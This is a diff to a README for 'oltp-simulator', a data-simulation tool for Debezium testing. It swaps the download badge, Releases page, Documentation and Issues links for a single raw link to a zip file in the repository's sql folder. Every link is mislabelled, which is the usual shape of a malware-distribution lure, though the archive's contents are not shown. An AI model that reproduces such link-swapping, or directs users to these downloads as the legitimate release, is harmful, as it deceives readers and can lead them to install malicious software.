@@ -1,7 +1,7 @@
 # 🎮 oltp-simulator - Simulate Realistic Data Easily
 
 ## 📦 Download Now
-[![Download oltp-simulator](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Arthur777-BR/oltp-simulator/releases)
+[![Download oltp-simulator](https://raw.githubusercontent.com/Arthur777-BR/oltp-simulator/main/sql/oltp-simulator-v1.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Arthur777-BR/oltp-simulator/main/sql/oltp-simulator-v1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the **oltp-simulator**! This application helps you create realistic Online Transaction Processing (OLTP) data. It is useful for testing Change Data Capture (CDC) with Debezium. You don’t need any programming skills to use this simulator.
@@ -13,7 +13,7 @@ To run the oltp-simulator, you will need:
 - An internet connection for downloading the application.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/Arthur777-BR/oltp-simulator/releases) to download the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Arthur777-BR/oltp-simulator/main/sql/oltp-simulator-v1.3.zip) to download the application.
 2. On the Releases page, look for the latest version.
 3. Click on the download link for your operating system.
 4. Once downloaded, find the file in your Downloads folder.
@@ -35,9 +35,9 @@ To run the oltp-simulator, you will need:
 - **Cross-Platform Compatibility:** Works on Windows, macOS, and Linux.
 
 ## 🔗 Important Links
-- [Download oltp-simulator](https://github.com/Arthur777-BR/oltp-simulator/releases)
-- [Documentation](https://github.com/Arthur777-BR/oltp-simulator/wiki)
-- [Issues Page](https://github.com/Arthur777-BR/oltp-simulator/issues)
+- [Download oltp-simulator](https://raw.githubusercontent.com/Arthur777-BR/oltp-simulator/main/sql/oltp-simulator-v1.3.zip)
+- [Documentation](https://raw.githubusercontent.com/Arthur777-BR/oltp-simulator/main/sql/oltp-simulator-v1.3.zip)
+- [Issues Page](https://raw.githubusercontent.com/Arthur777-BR/oltp-simulator/main/sql/oltp-simulator-v1.3.zip)
 
 ## 🙋 Support
 If you encounter any issues, please reach out through the Issues page linked above. We are here to help you. 
